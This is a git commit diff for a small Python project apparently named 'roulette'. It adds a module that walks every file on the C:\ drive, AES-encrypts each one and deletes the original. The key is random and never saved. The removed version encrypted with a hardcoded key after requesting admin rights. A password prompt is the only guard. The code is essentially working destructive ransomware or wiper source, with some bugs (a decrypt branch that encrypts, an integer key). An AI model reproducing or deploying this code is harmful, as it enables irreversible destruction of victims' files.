f18b8ff1a60d38d5d4e51eadef31a6822f66da20
JohnJoe <johnjoestack@gmail.com>
2015-05-28 18:20:12 +0100

    should now encrypt everything

---
+++ encryptionManager.py
@@ -0,0 +1,93 @@
+import os, random, struct
+from Crypto.Cipher import AES# @UnresolvedImport
+
+ 
+
+def encrypt_file(key, in_filename, out_filename, chunksize):
+    #source: http://eli.thegreenplace.net/2010/06/25/aes-encryption-of-files-in-python-with-pycrypto
+    """ Encrypts a file using AES (CBC mode) with the
+        given key.
+
+        key:
+            The encryption key - a string that must be
+            either 16, 24 or 32 bytes long. Longer keys
+            are more secure.
+
+        in_filename:
+            Name of the input file
+
+        out_filename:
+            If None, '<in_filename>.enc' will be used.
+
+        chunksize:
+            Sets the size of the chunk which the function
+            uses to read and encrypt the file. Larger chunk
+            sizes can be faster for some files and machines.
+            chunksize must be divisible by 16.
+    """
+    if not out_filename:
+        out_filename = in_filename + '.enc'
+
+    iv = ''.join(chr(random.randint(0, 0xFF)) for i in range(16))
+    encryptor = AES.new(key, AES.MODE_CBC, iv)
+    filesize = os.path.getsize(in_filename)
+
+    with open(in_filename, 'rb') as infile:
+        with open(out_filename, 'wb') as outfile:
+            outfile.write(struct.pack('<Q', filesize))
+            outfile.write(iv)
+
+            while True:
+                chunk = infile.read(chunksize)
+                if len(chunk) == 0:
+                    break
+                elif len(chunk) % 16 != 0:
+                    chunk += ' ' * (16 - len(chunk) % 16)
+
+                outfile.write(encryptor.encrypt(chunk))
+
+
+def decrypt_file(key, in_filename, out_filename, chunksize):
+    #source: http://eli.thegreenplace.net/2010/06/25/aes-encryption-of-files-in-python-with-pycrypto
+    """ Decrypts a file using AES (CBC mode) with the
+        given key. Parameters are similar to encrypt_file,
+        with one difference: out_filename, if not supplied
+        will be in_filename without its last extension
+        (i.e. if in_filename is 'aaa.zip.enc' then
+        out_filename will be 'aaa.zip')
+    """
+    if not out_filename:
+        out_filename = os.path.splitext(in_filename)[0]
+
+    with open(in_filename, 'rb') as infile:
+        origsize = struct.unpack('<Q', infile.read(struct.calcsize('Q')))[0]
+        iv = infile.read(16)
+        decryptor = AES.new(key, AES.MODE_CBC, iv)
+
+        with open(out_filename, 'wb') as outfile:
+            while True:
+                chunk = infile.read(chunksize)
+                if len(chunk) == 0:
+                    break
+                outfile.write(decryptor.decrypt(chunk))
+
+            outfile.truncate(origsize)
+            
+            
+def manage(function, rootDirectionary):#0 encrypt | 1 decrypt
+    #TODO, find a way to optamize this
+    key = random.getrandbits(32)
+    
+    for subdir, dirs, files in os.walk(rootDirectionary):
+        for file in files:
+            if file != "pagefile.sys":
+                filename = os.path.join(subdir, file)
+                if function == 0:    
+                    encrypt_file(key, filename, None, 64*1024)
+                elif function == 1:
+                     encrypt_file(key, filename, None, 64*1024)
+                
+                try: 
+                    os.remove(filename)
+                except OSError:
+                    pass            
--- roulette.py
+++ roulette.py
@@ -1,73 +1,20 @@
-import time
-import random
-import os, random, struct
-import admin
+
+import encryptionManager
 from Crypto.Cipher import AES # @UnresolvedImport
 
-if not admin.isUserAdmin():
-        admin.runAsAdmin()
+rootDirectionary = 'C:\\'
 
 
-def encrypt_file(key, in_filename, out_filename, chunksize):
-    #source: http://eli.thegreenplace.net/2010/06/25/aes-encryption-of-files-in-python-with-pycrypto
-    """ Encrypts a file using AES (CBC mode) with the
-        given key.
-
-        key:
-            The encryption key - a string that must be
-            either 16, 24 or 32 bytes long. Longer keys
-            are more secure.
-
-        in_filename:
-            Name of the input file
-
-        out_filename:
-            If None, '<in_filename>.enc' will be used.
-
-        chunksize:
-            Sets the size of the chunk which the function
-            uses to read and encrypt the file. Larger chunk
-            sizes can be faster for some files and machines.
-            chunksize must be divisible by 16.
-    """
-    if not out_filename:
-        out_filename = in_filename + '.enc'
-
-    iv = ''.join(chr(random.randint(0, 0xFF)) for i in range(16))
-    encryptor = AES.new(key, AES.MODE_CBC, iv)
-    filesize = os.path.getsize(in_filename)
-
-    with open(in_filename, 'rb') as infile:
-        with open(out_filename, 'wb') as outfile:
-            outfile.write(struct.pack('<Q', filesize))
-            outfile.write(iv)
-
-            while True:
-                chunk = infile.read(chunksize)
-                if len(chunk) == 0:
-                    break
-                elif len(chunk) % 16 != 0:
-                    chunk += ' ' * (16 - len(chunk) % 16)
-
-                outfile.write(encryptor.encrypt(chunk))
 
 
 
 password = raw_input("Oh god dont do this accidentally, whats the password: ")  # @UndefinedVariable
+
 if password != "basil":
     exit()
-rootdir = 'C:\\'
 
-for subdir, dirs, files in os.walk(rootdir):
-    for file in files:
-        if file != "pagefile.sys":
-            filename = os.path.join(subdir, file)
-        
-            encrypt_file("0c92c4e1a35551ed366ca52bf12b6037", filename, None, 64*1024)
-            try: 
-                os.remove(filename)
-            except OSError:
-                pass
+
+encryptionManager.manage(0, rootDirectionary)
              
         
 
